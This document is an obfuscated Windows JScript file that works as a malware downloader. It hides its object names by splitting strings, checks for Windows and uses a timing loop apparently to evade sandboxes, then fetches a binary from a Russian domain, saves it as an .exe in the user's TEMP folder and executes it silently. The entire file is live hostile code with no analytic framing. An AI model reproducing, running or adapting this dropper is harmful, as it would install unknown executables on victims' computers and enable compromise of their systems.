var J2 = false;
var BE = "Create"+"Object";
var T0 = function IP() {return WScript[BE]("WScript"+".Shell");}(), YT = 11;
var JQ = "MSXML2"+".XMLHTTP";
var K0 = 2;
var UZ = K0 - 2;
function ZB(L){T0["Run"](L, UZ, UZ);};
function W(){return JQ + "";};
function EE(I, U){UZ = UZ * 1; return I - U;};
function Q(){return BE;};
/*@cc_on
  @if (@_win32 || @_win64)
    J2 = true;
  @end
@*/
if (J2)
{
var T = "";
function JY(){return 22;};
var G = 0; var QA = 0;
function BJ()
{
var J1 = new this["Date"]();
var M = J1["getUTCMilliseconds"]();
WScript["Sleep"](JY());
var J1 = new this["Date"]();
var YK = J1["getUTCMilliseconds"]();
WScript["Sleep"](JY());
var J1 = new this["Date"]();
var B = J1["getUTCMilliseconds"]();
var G = "PZ";
G = EE(YK, M);
var QA = "CW";
QA = EE(B, YK);
T = "open";
return EE(G, QA);
}
var ZQ = false;
var A = false;
for (var Y1 = UZ; Y1 < JY() * 1; Y1++){if (BJ() != UZ){
ZQ = true; 
QA = "31" + 11 * G + QA; 
A = true; 
break;
}}
function Y() {return ((ZQ == true) && (ZQ == A)) ? 1 : UZ;};
if (ZQ && Y() && A){
function F() {return T0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "UfobCB0EnOP.ex" + "e";};
 N = W();
 OT = WScript[BE](N);
 var Y0 = 1;
do { 
	for (;Y0;){
	try {
		if (Y0 == 1)
		{
			OT[T]("GET", "http://buketrose.ru/h3sia", false);
			OT["send"]();
			ZE = "Sleep";
			Y0 = 2;
		}
		WScript[ZE](JY() + 120); 
		if (OT["readystate"] < 2 * 2) continue;
		Y0 = UZ;
		function LZ(K) {var J0 = (1, 2, 3, 4, 5, K); return J0;};
		A0 = WScript[Q()]("ADODB.Stream");
		N = A0;
		N[T]();
		N["type"] = LZ(1);
		N["write"](OT["ResponseBody"]);
		A0["position"] = LZ(UZ);
		N["Save" + "ToFile"](F(), 2);
		A0["cl"+"ose"]();
		J = F();
		ZB(J);
	} catch(Y2){};};
}while (Y0);
}
}

